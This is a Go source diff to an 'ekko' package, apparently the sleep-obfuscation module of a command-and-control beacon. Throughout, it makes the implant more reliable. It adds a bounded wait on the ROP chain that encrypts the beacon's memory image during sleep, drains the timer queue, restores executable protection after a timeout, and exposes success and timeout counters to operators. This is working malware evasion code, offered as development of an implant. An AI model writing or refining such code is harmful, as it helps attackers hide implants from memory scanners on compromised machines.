@@ -2,8 +2,10 @@ package ekko
 
 import (
 	"crypto/rand"
+	"errors"
 	"log"
 	"runtime"
+	"sync/atomic"
 	"syscall"
 	"unsafe"
 
@@ -20,6 +22,16 @@ const (
 	// CONTEXT_CONTROL on amd64. GetThreadContext after SuspendThread forces
 	// the kernel to actually commit the suspension before we touch memory.
 	contextControlAMD64 = 0x00100001
+
+	// Grace period (ms) added on top of the intended sleepTime before we
+	// assume the Ekko ROP chain has hung and unblock ourselves. sleepTime
+	// already includes beacon jitter (beacon.Duration() = Interval + rand
+	// Jitter, and the caller passes time.Until(nextCheckin)). This grace is
+	// pure overhead: ~600 ms of timer-queue scheduling plus the handful of
+	// VirtualProtect / SystemFunction032 calls in the chain. 5 seconds is
+	// plenty on any realistic host and doesn't meaningfully change beacon
+	// timing under normal conditions.
+	ekkoWaitGraceMs = 5000
 )
 
 var (
@@ -37,6 +49,7 @@ var (
 	procWaitForSingleObject   = kernel32dll.NewProc("WaitForSingleObject")
 	procSetEvent              = kernel32dll.NewProc("SetEvent")
 	procDeleteTimerQueue      = kernel32dll.NewProc("DeleteTimerQueue")
+	procDeleteTimerQueueEx    = kernel32dll.NewProc("DeleteTimerQueueEx")
 
 	//ntdll
 	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
@@ -47,6 +60,27 @@ var (
 	Advapi32dll           = syscall.NewLazyDLL("Advapi32.dll")
 	procSystemFunction032 = Advapi32dll.NewProc("SystemFunction032")
 )
+
+// ErrEkkoTimeout is returned when the ROP chain did not signal completion
+// within sleepTime + ekkoWaitGraceMs. The threads suspended by EkkoSleep
+// are still resumed in this case, so the beacon can continue running, but
+// this sleep cycle did not apply memory obfuscation.
+var ErrEkkoTimeout = errors.New("ekko: ROP chain did not complete within grace period")
+
+// Cumulative counters exposed via Stats() so operators can detect a host on
+// which Ekko is systematically failing and decide (through their existing
+// beacon telemetry / control plane) whether to disable sleep obfuscation.
+// We deliberately do NOT auto-fall-back to time.Sleep here: that would be a
+// visible behaviour change and belongs to a human decision, not a heuristic.
+var (
+	ekkoSuccesses atomic.Uint64
+	ekkoTimeouts  atomic.Uint64
+)
+
+// Stats returns cumulative Ekko success and timeout counts since process start.
+func Stats() (successes, timeouts uint64) {
+	return ekkoSuccesses.Load(), ekkoTimeouts.Load()
+}
 
 func EkkoSleep(sleepTime uint64) error {
 
@@ -124,6 +158,11 @@ func EkkoSleep(sleepTime uint64) error {
 
 
 	ekkoErr := ekko(sleepTime)
+	if errors.Is(ekkoErr, ErrEkkoTimeout) {
+		ekkoTimeouts.Add(1)
+	} else if ekkoErr == nil {
+		ekkoSuccesses.Add(1)
+	}
 
 	// Resume exactly the threads we suspended. Iterate the captured TID list
 	// rather than re-walking the snapshot, so a single OpenThread failure
@@ -226,8 +265,42 @@ func ekko(sleepTime uint64) error {
 	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopProtRX)), 500, 0, WT_EXECUTEINTIMERTHREAD)
 	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopSetEvt)), 600, 0, WT_EXECUTEINTIMERTHREAD)
 
-	windows.WaitForSingleObject(windows.Handle(hEvent), windows.INFINITE)
-	procDeleteTimerQueue.Call(hTimerQueue)
+	// Bounded wait: without this, a broken ROP chain (which we have observed
+	// in practice — the NtContinue-hijacked timer thread occasionally fails
+	// to schedule subsequent callbacks) leaves the beacon hung forever in
+	// WaitForSingleObject(hEvent, INFINITE) with peer threads still suspended.
+	waitTimeout := sleepTime + ekkoWaitGraceMs
+	if waitTimeout > 0xFFFFFFFE {
+		waitTimeout = 0xFFFFFFFE // clamp: never accidentally pass INFINITE
+	}
+	waitResult, _ := windows.WaitForSingleObject(windows.Handle(hEvent), uint32(waitTimeout))
 
+	if waitResult != windows.WAIT_OBJECT_0 {
+		// Timed out (or waited on an abandoned/failed event). Drain the queue
+		// SYNCHRONOUSLY before returning: DeleteTimerQueueEx with
+		// INVALID_HANDLE_VALUE blocks until any in-flight callbacks finish,
+		// so no NtContinue can fire on a thread-pool worker after we've
+		// returned and started resuming threads / mutating memory. Plain
+		// DeleteTimerQueue would NOT wait, which is why we don't reuse it here.
+		procDeleteTimerQueueEx.Call(hTimerQueue, ^uintptr(0))
+
+		// Force .text back to executable in case the chain got as far as
+		// RopProtRW / RopMemEnc but not RopProtRX / RopMemDec. Restoring to
+		// PAGE_EXECUTE_READWRITE matches the state a successful chain leaves
+		// behind (RopProtRX uses the same protection), so returning from
+		// EkkoSleep will not fault on the next instruction fetch. If the
+		// image is still encrypted the beacon will crash anyway — but that
+		// is a strictly better failure mode than a permanent hang.
+		var oldProt uint32
+		procVirtualProtect.Call(
+			ImageBase,
+			uintptr(nt_header.OptionalHeader.SizeOfImage),
+			uintptr(windows.PAGE_EXECUTE_READWRITE),
+			uintptr(unsafe.Pointer(&oldProt)),
+		)
+		return ErrEkkoTimeout
+	}
+
+	procDeleteTimerQueue.Call(hTimerQueue)
 	return nil
 }
